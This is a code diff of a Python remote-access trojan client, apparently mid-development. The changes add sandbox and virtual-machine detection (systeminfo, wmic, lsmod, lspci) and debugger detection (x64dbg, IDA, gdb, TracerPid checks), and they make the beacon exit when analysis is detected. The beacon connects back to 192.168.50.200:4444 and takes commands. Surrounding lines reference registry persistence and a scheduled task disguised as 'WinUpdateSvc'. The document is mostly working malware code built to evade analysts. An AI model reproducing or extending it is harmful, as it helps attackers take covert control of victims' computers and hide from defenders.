@@ -6,7 +6,6 @@ import ctypes
 import subprocess
 from cryptography.fernet import Fernet
 import platform
-import random
 
 
 
@@ -23,12 +22,6 @@ def decrypt(data: bytes) -> bytes:
 
 def to_chunks(data: bytes, chunk_size: int = 1024):
     return [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
-
-# ------------------ Smart sleep ------------------
-def smart_sleep():
-    delay = random.randint(20, 40)
-    print(f"[*] Sleeping for {delay} seconds...")
-    time.sleep(delay)
 
 # ------------------ Registry Persistence ------------------
 
@@ -64,6 +57,185 @@ def remove_task(task_name="WinUpdateSvc"):
         print(result.stdout)
     except Exception as e:
         print(f"❌ Error removing task: {e}")
+
+# ------------------ Anti-Detection ------------------
+
+def check_vm():
+    vm_indicators = [
+        "VMware",
+        "VBox",
+        "QEMU",
+        "Xen"
+    ]
+    
+    try:
+        vm_count = 0
+        os_name = platform.system()
+        
+        if os_name == "Windows":
+            
+            system_info = subprocess.check_output("systeminfo", shell=True).decode().lower()
+            
+            
+            for indicator in vm_indicators:
+                if indicator.lower() in system_info:
+                    vm_count += 1
+            
+            
+            vm_processes = ["vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe", "VBoxService.exe"]
+            for proc in vm_processes:
+                if subprocess.run(f"tasklist | findstr {proc}", shell=True).returncode == 0:
+                    vm_count += 1
+            
+            
+            try:
+                hw_info = subprocess.check_output("wmic computersystem get manufacturer,model", shell=True).decode().lower()
+                if "vmware" in hw_info or "virtualbox" in hw_info or "qemu" in hw_info:
+                    vm_count += 2
+            except:
+                pass
+                
+            
+            try:
+                services = subprocess.check_output("wmic service get name", shell=True).decode().lower()
+                if "vmware" in services or "vbox" in services:
+                    vm_count += 1
+            except:
+                pass
+                
+        else:  # Linux
+            
+            try:
+                system_info = subprocess.check_output("systemd-detect-virt", shell=True).decode().lower()
+                if system_info.strip() != "none":
+                    vm_count += 2
+            except:
+                pass
+                
+            
+            vm_processes = ["vmtoolsd", "vmware-toolbox", "VBoxService"]
+            for proc in vm_processes:
+                if subprocess.run(f"ps aux | grep {proc}", shell=True).returncode == 0:
+                    vm_count += 1
+            
+            
+            try:
+                hw_info = subprocess.check_output("lscpu", shell=True).decode().lower()
+                if "vmware" in hw_info or "virtualbox" in hw_info or "qemu" in hw_info:
+                    vm_count += 2
+            except:
+                pass
+                
+            
+            try:
+                modules = subprocess.check_output("lsmod", shell=True).decode().lower()
+                if "vmware" in modules or "vbox" in modules:
+                    vm_count += 1
+            except:
+                pass
+                
+            
+            try:
+                devices = subprocess.check_output("lspci", shell=True).decode().lower()
+                if "vmware" in devices or "virtualbox" in devices:
+                    vm_count += 1
+            except:
+                pass
+        
+        # Return True only if multiple indicators are found
+        return vm_count >= 3
+                
+    except:
+        return False
+
+def check_debugger():
+    try:
+        os_name = platform.system()
+        debug_count = 0
+        
+        if os_name == "Windows":
+            if ctypes.windll.kernel32.IsDebuggerPresent() != 0:
+                debug_count += 2
+            
+            debugger_processes = [
+                "x64dbg.exe", "x32dbg.exe", "ollydbg.exe", "ida.exe", "ida64.exe",
+                "windbg.exe", "immunitydebugger.exe", "radare2.exe", "ghidra.exe"
+            ]
+            for proc in debugger_processes:
+                if subprocess.run(f"tasklist | findstr {proc}", shell=True).returncode == 0:
+                    debug_count += 1
+            
+            try:
+                netstat = subprocess.check_output("netstat -an", shell=True).decode().lower()
+                debug_ports = ["23946", "23947", "23948", "23949"]
+                for port in debug_ports:
+                    if port in netstat:
+                        debug_count += 1
+            except:
+                pass
+                
+            try:
+                reg_keys = [
+                    r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug",
+                    r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
+                ]
+                for key in reg_keys:
+                    result = subprocess.run(f'reg query "{key}"', shell=True, capture_output=True)
+                    if result.returncode == 0:
+                        debug_count += 1
+            except:
+                pass
+                
+        else:  # Linux
+            debugger_processes = [
+                "gdb", "lldb", "radare2", "ida", "ghidra", "strace", "ltrace"
+            ]
+            for proc in debugger_processes:
+                if subprocess.run(f"ps aux | grep {proc}", shell=True).returncode == 0:
+                    debug_count += 1
+            
+            try:
+                env_vars = os.environ
+                debug_vars = ["LD_PRELOAD", "LD_LIBRARY_PATH", "LD_DEBUG"]
+                for var in debug_vars:
+                    if var in env_vars:
+                        debug_count += 1
+            except:
+                pass
+            
+            try:
+                netstat = subprocess.check_output("netstat -tuln", shell=True).decode().lower()
+                debug_ports = ["23946", "23947", "23948", "23949"]
+                for port in debug_ports:
+                    if port in netstat:
+                        debug_count += 1
+            except:
+                pass
+            
+            try:
+                debug_files = [
+                    "/proc/self/status",
+                    "/proc/self/fd/0",
+                    "/proc/self/cmdline"
+                ]
+                for file in debug_files:
+                    if os.path.exists(file):
+                        with open(file, 'r') as f:
+                            content = f.read().lower()
+                            if "tracerpid" in content and "0" not in content:
+                                debug_count += 2
+                            if "pipe" in content:
+                                debug_count += 1
+                            if any(debugger in content for debugger in debugger_processes):
+                                debug_count += 1
+            except:
+                pass
+        
+        return debug_count >= 3
+                
+    except:
+        return False
+
 # ------------------ Wallpaper Control ------------------
 
 def change_wallpaper(image_path: str) -> bytes:
@@ -196,7 +368,7 @@ class ClientHandler:
         time.sleep(1)
         for chunk in chunks:
             self.send(chunk)
-            time.sleep(0.02)
+            time.sleep(0.1)
 
 
     def handle_commands(self,os_name):
@@ -430,29 +602,34 @@ class ClientHandler:
 # ------------------ Main Server ------------------
 
 def Connect_to_server():
-    operating_system = predict_operating_system()
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-        while 1:
-            try:
-                sock.connect(("192.168.50.200",4444))
-                print("[*] Connected to server ...    ")
-                time.sleep(1)
-                sock.sendall(key)
-                time.sleep(1)
-                sock.sendall(operating_system.encode())
-                client = ClientHandler(sock)
-                if client.authenticate():
-                    client.handle_commands(operating_system)
-                else:
-                    print("Authentication Error")
-                client.connection.close()
-                return
-            except Exception:
-                timer = 20
-                print("Server is not up yet. Trying again in")
-                for i in range(timer,0,-1):
-                    print(f"{i} seconds ", end="\r",flush=True)
+    if not (check_debugger() or check_vm()):
+        print(" No Debugger or VM detected.")
+        operating_system = predict_operating_system()
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+            while 1:
+                try:
+                    sock.connect(("192.168.50.200",4444))
+                    print("[*] Connected to server ...    ")
                     time.sleep(1)
+                    sock.sendall(key)
+                    time.sleep(1)
+                    sock.sendall(operating_system.encode())
+                    client = ClientHandler(sock)
+                    if client.authenticate():
+                        client.handle_commands(operating_system)
+                    else:
+                        print("Authentication Error")
+                    client.connection.close()
+                    return
+                except Exception:
+                    timer = 20
+                    print("Server is not up yet. Trying again in")
+                    for i in range(timer,0,-1):
+                        print(f"{i} seconds ", end="\r",flush=True)
+                        time.sleep(1)
+    else:
+        print("Debugger or VM detected. Exiting...")
+        sys.exit()
 
 if __name__ == "__main__":
     #create_persistent_task()
